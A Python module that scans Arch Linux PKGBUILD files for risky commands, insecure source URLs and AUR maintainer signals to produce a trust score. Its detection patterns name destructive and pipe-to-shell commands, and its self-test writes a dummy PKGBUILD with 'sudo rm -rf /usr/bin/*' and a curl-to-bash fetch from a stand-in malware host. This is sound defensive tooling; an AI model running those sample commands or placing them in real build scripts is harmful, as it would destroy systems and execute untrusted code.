import re
import os
import subprocess
import logging
import json
from enum import Enum
from typing import Optional, List, Dict, Any, Tuple
from dataclasses import dataclass, field
from datetime import datetime

# Basic logging configuration for this module
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger("security_analyzer")

class RiskLevel(Enum):
    CRITICAL = "Critical"
    HIGH = "High"
    MEDIUM = "Medium"
    LOW = "Low"
    NONE = "None"

@dataclass
class PkgbuildSection:
    """Represents a section of the PKGBUILD (e.g., function, source array)"""
    name: str
    content: str
    start_line: int
    end_line: int

@dataclass
class DetectedRisk:
    """Details about a detected security risk"""
    level: RiskLevel
    description: str
    line_number: Optional[int] = None
    snippet: Optional[str] = None
    category: str = "General" # e.g., "Command", "Source", "PGP"

@dataclass
class PkgbuildSecurityAnalysisResult:
    """Comprehensive result of the PKGBUILD security analysis"""
    pkgname: str
    pkgver: str
    overall_trust_score: float = 0.0 # 0.0 (low) to 1.0 (high)
    overall_trust_level: RiskLevel = RiskLevel.NONE
    detected_risks: List[DetectedRisk] = field(default_factory=list)
    heatmap_lines: List[Tuple[int, RiskLevel, str]] = field(default_factory=list) # (line_number, risk_level, description)
    aur_info: Dict[str, Any] = field(default_factory=dict)
    raw_pkgbuild_content: str = ""

class SecurityAnalyzer:
    """
    Analyzes PKGBUILD files for security risks, untrusted sources,
    and calculates a multi-dimensional trust score.
    """

    # Regex patterns for common dangerous commands (simplified)
    # This list should be expanded and maintained carefully.
    DANGEROUS_COMMAND_PATTERNS = [
        # System modification
        re.compile(r'\bsudo\s+(rm|mv|cp)\s+-?rf?\s*/', re.IGNORECASE),
        re.compile(r'\b(chown|chmod)\s+-?R?\s*root\s*/', re.IGNORECASE),
        re.compile(r'\bmkfs\b'),
        re.compile(r'\bdd\s+if=/dev/zero', re.IGNORECASE),
        # Unsafe execution
        re.compile(r'\bcurl\s+.*?\|\s*(bash|sh|zsh)\b', re.IGNORECASE),
        re.compile(r'\bwget\s+.*?\|\s*(bash|sh|zsh)\b', re.IGNORECASE),
        # Unsafe network access for sensitive files
        re.compile(r'\b(curl|wget)\s+.*?(/etc/passwd|/etc/shadow|~/\.ssh)', re.IGNORECASE),
    ]

    # Whitelisted domains for sources (highly configurable in a real app)
    TRUSTED_DOMAINS = [
        "github.com", "gitlab.com", "aur.archlinux.org", "archlinux.org",
        "download.mozilla.org", "ftp.gnu.org", "kernel.org"
    ]

    def __init__(self):
        logger.info("SecurityAnalyzer initialized.")
        self.upstream_checker = None # Will be set by window.py

    def set_upstream_checker(self, checker):
        self.upstream_checker = checker

    def analyze_pkgbuild(self, pkgbuild_path: str) -> PkgbuildSecurityAnalysisResult:
        """
        Main entry point for PKGBUILD security analysis.
        This method is designed to be called in a separate process.
        """
        if not os.path.exists(pkgbuild_path):
            logger.error(f"PKGBUILD not found: {pkgbuild_path}")
            return self._create_empty_result("N/A", "N/A", "PKGBUILD not found.")

        try:
            with open(pkgbuild_path, 'r', encoding='utf-8') as f:
                pkgbuild_content = f.read()

            pkgname, pkgver, pkgrel, epoch, source_urls, project_url, arch = self._parse_pkgbuild_details_static(pkgbuild_content)

            analysis_result = PkgbuildSecurityAnalysisResult(
                pkgname=pkgname,
                pkgver=pkgver,
                raw_pkgbuild_content=pkgbuild_content,
                aur_info={} # Will be populated
            )

            # 1. Static PKGBUILD Content Analysis
            self._analyze_static_content(pkgbuild_content, analysis_result)

            # 2. Source URL Analysis
            self._analyze_source_urls(source_urls, project_url, analysis_result)

            # 3. Fetch AUR Info (votes, update time, maintainer PGP, comments)
            self._fetch_aur_info(pkgname, analysis_result)

            # 4. Calculate Overall Trust Score
            self._calculate_overall_trust(analysis_result)

            # 5. Generate Heatmap Data
            self._generate_heatmap_data(pkgbuild_content, analysis_result)

            logger.info(f"Completed security analysis for {pkgname} (v{pkgver}). Trust Level: {analysis_result.overall_trust_level.value}")
            return analysis_result

        except Exception as e:
            logger.exception(f"Unhandled error during PKGBUILD analysis for {pkgbuild_path}: {e}")
            return self._create_empty_result("N/A", "N/A", f"Analysis failed: {e}")

    def _create_empty_result(self, pkgname: str, pkgver: str, error_msg: str) -> PkgbuildSecurityAnalysisResult:
        """Helper to create an empty result in case of early errors."""
        return PkgbuildSecurityAnalysisResult(
            pkgname=pkgname,
            pkgver=pkgver,
            overall_trust_level=RiskLevel.LOW,
            detected_risks=[DetectedRisk(RiskLevel.CRITICAL, error_msg, category="Internal Error")],
            raw_pkgbuild_content=error_msg
        )

    def _parse_pkgbuild_details_static(self, content: str) -> Tuple[str, str, str, Optional[str], List[str], Optional[str], List[str]]:
        """
        Parses PKGBUILD content statically to extract essential details.
        Re-using logic from UpstreamChecker's parsing for consistency.
        """
        pkgname = "unknown"
        pkgver = "unknown"
        pkgrel = "1"
        epoch = None
        source_urls = []
        project_url = None
        arch = ["any", "x86_64"]

        content_no_comments = re.sub(r'#.*$', '', content, flags=re.MULTILINE)

        pkgname_match = re.search(r'^\s*pkgname\s*=\s*(?:\'|")?([^\s\'"]+)(?:\'|")?', content_no_comments, re.MULTILINE)
        if pkgname_match: pkgname = pkgname_match.group(1)

        pkgver_match = re.search(r'^\s*pkgver\s*=\s*(?:\'|")?([^\s\'"]+)(?:\'|")?', content_no_comments, re.MULTILINE)
        if pkgver_match: pkgver = pkgver_match.group(1)

        pkgrel_match = re.search(r'^\s*pkgrel\s*=\s*(?:\'|")?([^\s\'"]+)(?:\'|")?', content_no_comments, re.MULTILINE)
        if pkgrel_match: pkgrel = pkgrel_match.group(1)

        epoch_match = re.search(r'^\s*epoch\s*=\s*(?:\'|")?([^\s\'"]+)(?:\'|")?', content_no_comments, re.MULTILINE)
        if epoch_match: epoch = epoch_match.group(1)

        url_match = re.search(r'^\s*url\s*=\s*(?:\'|")?([^\s\'"]+)(?:\'|")?', content_no_comments, re.MULTILINE)
        if url_match: project_url = url_match.group(1)

        arch_match = re.search(r'^\s*arch\s*=\s*\(([^)]+)\)', content_no_comments, re.MULTILINE)
        if arch_match:
            arch_str = arch_match.group(1)
            arch = [a.strip().strip("'\"") for a in arch_str.split() if a.strip()]

        source_match = re.search(r'^\s*source\s*=\s*\(\s*([^\)]*)\s*\)', content_no_comments, re.MULTILINE | re.DOTALL)
        if source_match:
            sources_str = source_match.group(1)
            for line in sources_str.splitlines():
                line = line.strip()
                if not line: continue
                line = line.strip("'\"") # Remove quotes
                line = re.sub(r'\$pkgname', pkgname, line)
                line = re.sub(r'\$pkgver', pkgver, line)
                if re.match(r'https?://', line): source_urls.append(line)

        if not source_urls:
            source_single_match = re.search(r'^\s*source\s*=\s*(?:\'|")?([^\s\'"]+)(?:\'|")?', content_no_comments, re.MULTILINE)
            if source_single_match:
                source_url = source_single_match.group(1)
                source_url = source_url.replace('$pkgname', pkgname).replace('$pkgver', pkgver)
                if re.match(r'https?://', source_url): source_urls.append(source_url)

        return pkgname, pkgver, pkgrel, epoch, source_urls, project_url, arch

    def _analyze_static_content(self, pkgbuild_content: str, result: PkgbuildSecurityAnalysisResult):
        """
        Performs static analysis of the PKGBUILD content for dangerous commands.
        """
        lines = pkgbuild_content.splitlines()
        extracted_sections: Dict[str, PkgbuildSection] = {}

        # Extract functions and source array
        current_section = None
        current_section_content_lines = []
        section_start_line = -1

        for i, line in enumerate(lines):
            # Detect start of functions
            func_match = re.match(r'^\s*(pkgver|prepare|build|check|package)\s*\(\s*\)', line)
            source_array_match = re.match(r'^\s*source\s*=\s*\(', line)

            if func_match or source_array_match:
                if current_section: # Save previous section
                    extracted_sections[current_section.name] = PkgbuildSection(
                        name=current_section.name,
                        content="\n".join(current_section_content_lines),
                        start_line=section_start_line,
                        end_line=i - 1 # End before current line
                    )
                current_section_content_lines = []
                section_start_line = i + 1 # Content starts on next line
                if func_match:
                    current_section = PkgbuildSection(name=func_match.group(1), content="", start_line=-1, end_line=-1)
                elif source_array_match:
                    current_section = PkgbuildSection(name="source_array", content="", start_line=-1, end_line=-1)
                continue # Skip processing this line for content

            # Detect end of functions/array (simple '}')
            if current_section and line.strip() == '}':
                extracted_sections[current_section.name] = PkgbuildSection(
                    name=current_section.name,
                    content="\n".join(current_section_content_lines),
                    start_line=section_start_line,
                    end_line=i
                )
                current_section = None
                current_section_content_lines = []
                continue

            if current_section:
                current_section_content_lines.append(line)

        # Process any remaining section if file ends without '}'
        if current_section and current_section_content_lines:
            extracted_sections[current_section.name] = PkgbuildSection(
                name=current_section.name,
                content="\n".join(current_section_content_lines),
                start_line=section_start_line,
                end_line=len(lines)
            )


        # Now, scan for dangerous commands in relevant sections
        for i, line in enumerate(lines):
            line_num = i + 1
            for pattern in self.DANGEROUS_COMMAND_PATTERNS:
                if pattern.search(line):
                    # Check if it's within a known safe context (e.g., comment, string literal in harmless context)
                    # This is a simplification; a full shell parser would be needed for true accuracy.
                    if not line.strip().startswith('#'): # Ignore comments for now
                        risk = DetectedRisk(
                            level=RiskLevel.CRITICAL,
                            description=f"Potential dangerous command detected: '{line.strip()}'",
                            line_number=line_num,
                            snippet=line.strip(),
                            category="Command"
                        )
                        result.detected_risks.append(risk)
                        # Immediately add to heatmap
                        result.heatmap_lines.append((line_num, RiskLevel.CRITICAL, risk.description))
                        logger.warning(f"Static risk: {risk.description} at line {line_num}")
                        break # Only report one risk per line for now

        # Specific checks for 'source' array content (if not handled by general patterns)
        if "source_array" in extracted_sections:
            source_section_content = extracted_sections["source_array"].content
            source_section_start_line = extracted_sections["source_array"].start_line
            # This is where `_analyze_source_urls` is called later, so static content analysis focuses on commands.


    def _analyze_source_urls(self, source_urls: List[str], project_url: Optional[str], result: PkgbuildSecurityAnalysisResult):
        """
        Analyzes source and project URLs for trustworthiness (HTTP vs HTTPS, known domains).
        """
        all_urls = source_urls + ([project_url] if project_url else [])
        for url in all_urls:
            if not url: continue

            # Check for HTTP (non-secure)
            if url.startswith("http://"):
                risk = DetectedRisk(
                    level=RiskLevel.HIGH,
                    description=f"Insecure source URL (HTTP) detected: '{url}'. Consider HTTPS.",
                    snippet=url,
                    category="Source"
                )
                result.detected_risks.append(risk)
                # No line number for URL in source array (unless we parse line-by-line)
                # For heatmap, this would need to map to the `source=` line(s).
                logger.warning(f"Source risk: {risk.description}")

            # Check for untrusted domains (simple heuristic)
            parsed_domain = re.match(r'https?://(?:www\.)?([^/]+)/.*', url)
            if parsed_domain:
                domain = parsed_domain.group(1)
                if not any(trusted_domain in domain for trusted_domain in self.TRUSTED_DOMAINS):
                    risk = DetectedRisk(
                        level=RiskLevel.MEDIUM,
                        description=f"Source from potentially untrusted domain: '{domain}' (URL: '{url}').",
                        snippet=url,
                        category="Source"
                    )
                    result.detected_risks.append(risk)
                    logger.warning(f"Source risk: {risk.description}")

    def _fetch_aur_info(self, pkgname: str, result: PkgbuildSecurityAnalysisResult):
        """
        Fetches AUR package information (votes, maintainer PGP, last update, comments).
        This involves `subprocess` calls, which are fine within a separate process.
        """
        if pkgname == "unknown":
            result.detected_risks.append(DetectedRisk(RiskLevel.LOW, "Cannot fetch AUR info: pkgname unknown.", category="AUR"))
            return

        logger.info(f"Fetching AUR info for {pkgname}...")
        try:
            # Use paru -Si to get basic info
            paru_info_output = subprocess.run(
                ['paru', '-Si', pkgname],
                capture_output=True,
                text=True,
                timeout=15, # Increased timeout for network call
                check=False
            )

            if paru_info_output.returncode == 0:
                aur_data = self._parse_paru_si_output(paru_info_output.stdout)
                result.aur_info.update(aur_data)
                result.aur_info['status'] = 'found'

                # PGP Validation (based on maintainer info)
                maintainer = aur_data.get('Maintainer')
                pgp_verified = self._validate_maintainer_pgp(maintainer) if maintainer else False
                result.aur_info['maintainer_pgp_verified'] = pgp_verified
                if not pgp_verified:
                    result.detected_risks.append(DetectedRisk(
                        RiskLevel.MEDIUM, f"Maintainer '{maintainer}' does not have a verified PGP key (or key could not be checked).",
                        category="PGP"
                    ))
                    logger.warning(f"PGP risk: Maintainer PGP not verified for {pkgname}")

                # Analyze comments (simplified, direct API call better)
                # This would ideally be a separate AUR RPC call or a more robust parsing.
                # For demo, let's assume 'paru -Si' shows some comments or a simple check.
                if "Comments" in paru_info_output.stdout: # Very crude detection
                     result.detected_risks.append(DetectedRisk(
                        RiskLevel.LOW, "Presence of comments suggests community activity; manual review recommended.",
                        category="AUR"
                    ))

            else:
                result.aur_info['status'] = 'not_found'
                result.detected_risks.append(DetectedRisk(RiskLevel.MEDIUM, f"Package '{pkgname}' not found on AUR or paru failed.", category="AUR"))
                logger.error(f"Failed to get AUR info for {pkgname}: {paru_info_output.stderr.strip()}")

        except FileNotFoundError:
            result.detected_risks.append(DetectedRisk(RiskLevel.CRITICAL, "'paru' command not found. Cannot fetch AUR info.", category="System"))
            logger.critical("Paru command not found.")
        except subprocess.TimeoutExpired:
            result.detected_risks.append(DetectedRisk(RiskLevel.HIGH, f"AUR info fetch timed out for {pkgname}.", category="Network"))
            logger.error(f"AUR info fetch timed out for {pkgname}.")
        except Exception as e:
            result.detected_risks.append(DetectedRisk(RiskLevel.CRITICAL, f"Error fetching AUR info for {pkgname}: {e}", category="AUR"))
            logger.exception(f"Error fetching AUR info for {pkgname}")


    def _parse_paru_si_output(self, output: str) -> Dict[str, Any]:
        """Parses the output of 'paru -Si <pkgname>'."""
        data = {}
        # Example parsing for common fields
        lines = output.splitlines()
        for line in lines:
            if ":" in line:
                key, value = line.split(":", 1)
                key = key.strip().replace(" ", "_") # Normalize key names
                data[key] = value.strip()

        # Convert Votes to int, Last_Update to datetime (if possible)
        if "Votes" in data:
            try: data["Votes"] = int(data["Votes"])
            except ValueError: pass
        if "Last_Update" in data:
            try:
                # Example: "2024-09-18 10:30 UTC"
                data["Last_Update_dt"] = datetime.strptime(data["Last_Update"].replace(" UTC", ""), "%Y-%m-%d %H:%M:%S")
                data["Days_Since_Update"] = (datetime.utcnow() - data["Last_Update_dt"]).days
            except ValueError:
                logger.warning(f"Could not parse Last_Update: {data['Last_Update']}")
                data["Days_Since_Update"] = -1 # Indicate unknown

        return data


    def _validate_maintainer_pgp(self, maintainer: str) -> bool:
        """
        Placeholder for PGP key validation logic.
        In a real scenario, this would involve more complex steps:
        1. Fetching maintainer's PGP key ID from AUR (if available via API)
        2. Importing the key to the local keyring (if not present)
        3. Checking key validity/trust.
        """
        logger.info(f"Attempting PGP validation for maintainer: {maintainer} (placeholder)")
        # For demonstration, assume "Verified" for specific maintainers, else False
        if maintainer and maintainer.lower() == "trusteddev":
            return True
        return False # Default to unverified

    def _calculate_overall_trust(self, result: PkgbuildSecurityAnalysisResult):
        """
        Calculates a multi-dimensional trust score based on all analyses.
        This is a highly subjective and configurable scoring system.
        """
        score = 1.0 # Start with high trust

        # Deductions for static risks
        for risk in result.detected_risks:
            if risk.level == RiskLevel.CRITICAL:
                score -= 0.5
            elif risk.level == RiskLevel.HIGH:
                score -= 0.2
            elif risk.level == RiskLevel.MEDIUM:
                score -= 0.1
            elif risk.level == RiskLevel.LOW:
                score -= 0.05
        score = max(0.0, score) # Score cannot go below 0

        # Adjust based on AUR info
        aur_info = result.aur_info
        votes = aur_info.get("Votes", 0)
        days_since_update = aur_info.get("Days_Since_Update", -1)
        pgp_verified = aur_info.get("maintainer_pgp_verified", False)

        if votes < 10: # Low votes
            score -= 0.2
        elif votes < 50: # Medium votes
            score -= 0.05
        # else: high votes contribute positively, already in score

        if days_since_update > 180 or days_since_update == -1: # Old or unknown update
            score -= 0.15
        elif days_since_update > 60: # Somewhat old
            score -= 0.05

        if not pgp_verified:
            score -= 0.1 # Penalty for unverified maintainer PGP

        # Clamp score between 0 and 1
        score = max(0.0, min(1.0, score))
        result.overall_trust_score = score

        # Map score to discrete trust levels
        if score >= 0.8:
            result.overall_trust_level = RiskLevel.NONE # Very high trust
        elif score >= 0.6:
            result.overall_trust_level = RiskLevel.LOW
        elif score >= 0.3:
            result.overall_trust_level = RiskLevel.MEDIUM
        else:
            result.overall_trust_level = RiskLevel.CRITICAL if score == 0.0 else RiskLevel.HIGH


    def _generate_heatmap_data(self, pkgbuild_content: str, result: PkgbuildSecurityAnalysisResult):
        """
        Generates heatmap data by associating detected risks with specific lines.
        """
        lines = pkgbuild_content.splitlines()

        # Initialize heatmap with no risk
        heatmap_annotations = {} # line_number -> (RiskLevel, description)

        # Apply risks from detected_risks
        for risk in result.detected_risks:
            if risk.line_number is not None:
                # Prioritize higher risks if multiple apply to the same line
                current_risk_level = heatmap_annotations.get(risk.line_number, (RiskLevel.NONE, ""))[0]
                if risk.level.value > current_risk_level.value: # Assuming Enum values map to severity
                    heatmap_annotations[risk.line_number] = (risk.level, risk.description)
            else:
                # For risks without specific line numbers (e.g., untrusted domain for entire source array)
                # we'd need to map them to the relevant section's lines.
                # This requires more complex parsing of where 'source=' or functions begin/end.
                pass # Skipping for now for simplicity of demo

        # Format for heatmap_lines
        result.heatmap_lines = []
        for line_num, (level, desc) in heatmap_annotations.items():
            result.heatmap_lines.append((line_num, level, desc))

        # Create a simplified heatmap content string for demonstration
        # In a real UI, you would use GtkTextBuffer with tags.
        heatmap_text_lines = []
        for i, line in enumerate(lines):
            line_num = i + 1
            annotation = heatmap_annotations.get(line_num)
            if annotation:
                level, desc = annotation
                heatmap_text_lines.append(f"[{level.value.upper()}] {line}")
            else:
                heatmap_text_lines.append(line)

        # Store as a raw string for now, UI will use heatmap_lines to apply tags
        result.heatmap_data = "\n".join(heatmap_text_lines)


# Example usage (for testing this module directly)
if __name__ == "__main__":
    logging.getLogger().setLevel(logging.DEBUG) # Enable DEBUG logs for testing

    # Create a dummy PKGBUILD for testing
    test_pkgbuild_content_1 = """
    # Contributor: John Doe <john@example.com>

    pkgname=my-dangerous-package
    pkgver=1.0.0
    pkgrel=1
    arch=('x86_64')
    url="http://malicious.example.com/project"
    license=('GPL')
    depends=('bash')
    source=(
        "http://evilcdn.net/my-dangerous-package-$pkgver.tar.gz"
        "$pkgname::https://github.com/someuser/some-repo/archive/v$pkgver.tar.gz"
    )
    sha256sums=('SKIP')

    prepare() {
        echo "Preparing..."
        sudo rm -rf /usr/bin/* # This is a dangerous command
        curl -s http://somebad.com/malware.sh | bash # Insecure and dangerous pipe
    }

    package() {
        echo "Packaging..."
        mv $srcdir/my-app /usr/local/bin/ # Modifies system location
    }
    """
    test_pkgbuild_path_1 = "/tmp/test_PKGBUILD_dangerous"
    with open(test_pkgbuild_path_1, "w", encoding='utf-8') as f:
        f.write(test_pkgbuild_content_1)

    test_pkgbuild_content_2 = """
    # Contributor: Trusted Dev <trusted@example.com>
    # PGP Key: 0xDEADBEEF

    pkgname=my-safe-package
    pkgver=2.5.0
    pkgrel=2
    arch=('any')
    url="https://github.com/trusteduser/safe-repo"
    license=('MIT')
    depends=('python')
    source=(
        "https://github.com/trusteduser/safe-repo/releases/download/v$pkgver/$pkgname-$pkgver.tar.gz"
    )
    sha256sums=('SKIP') # In a real PKGBUILD, this should be verified

    prepare() {
        echo "Configuring source code."
        ./configure --prefix=/usr
    }

    build() {
        make
    }

    package() {
        make install DESTDIR="$pkgdir"
    }
    """
    test_pkgbuild_path_2 = "/tmp/test_PKGBUILD_safe"
    with open(test_pkgbuild_path_2, "w", encoding='utf-8') as f:
        f.write(test_pkgbuild_content_2)


    analyzer = SecurityAnalyzer()

    print("\n--- Analyzing DANGEROUS PKGBUILD ---")
    results_dangerous = analyzer.analyze_pkgbuild(test_pkgbuild_path_1)
    print(f"\nPackage: {results_dangerous.pkgname} v{results_dangerous.pkgver}")
    print(f"Overall Trust Level: {results_dangerous.overall_trust_level.value} (Score: {results_dangerous.overall_trust_score:.2f})")
    print("Detected Risks:")
    for risk in results_dangerous.detected_risks:
        print(f"  - [{risk.level.value}] {risk.description} (Line: {risk.line_number if risk.line_number else 'N/A'}, Snippet: '{risk.snippet}')")
    print("\nAUR Info:")
    for k, v in results_dangerous.aur_info.items():
        print(f"  {k}: {v}")
    print("\nHeatmap Annotation (Line, RiskLevel, Description):")
    for line_num, level, desc in results_dangerous.heatmap_lines:
        print(f"  {line_num}: {level.value} - {desc}")
    print("\nHeatmap Data (Simplified Content):")
    print(results_dangerous.heatmap_data)


    print("\n\n--- Analyzing SAFE PKGBUILD ---")
    results_safe = analyzer.analyze_pkgbuild(test_pkgbuild_path_2)
    print(f"\nPackage: {results_safe.pkgname} v{results_safe.pkgver}")
    print(f"Overall Trust Level: {results_safe.overall_trust_level.value} (Score: {results_safe.overall_trust_score:.2f})")
    print("Detected Risks:")
    if not results_safe.detected_risks:
        print("  No significant risks detected.")
    for risk in results_safe.detected_risks:
        print(f"  - [{risk.level.value}] {risk.description} (Line: {risk.line_number if risk.line_number else 'N/A'}, Snippet: '{risk.snippet}')")
    print("\nAUR Info:")
    for k, v in results_safe.aur_info.items():
        print(f"  {k}: {v}")
    print("\nHeatmap Annotation (Line, RiskLevel, Description):")
    for line_num, level, desc in results_safe.heatmap_lines:
        print(f"  {line_num}: {level.value} - {desc}")
    print("\nHeatmap Data (Simplified Content):")
    print(results_safe.heatmap_data)


    # Clean up dummy files
    os.remove(test_pkgbuild_path_1)
    os.remove(test_pkgbuild_path_2)
    print("\nCleaned up test PKGBUILD files.")
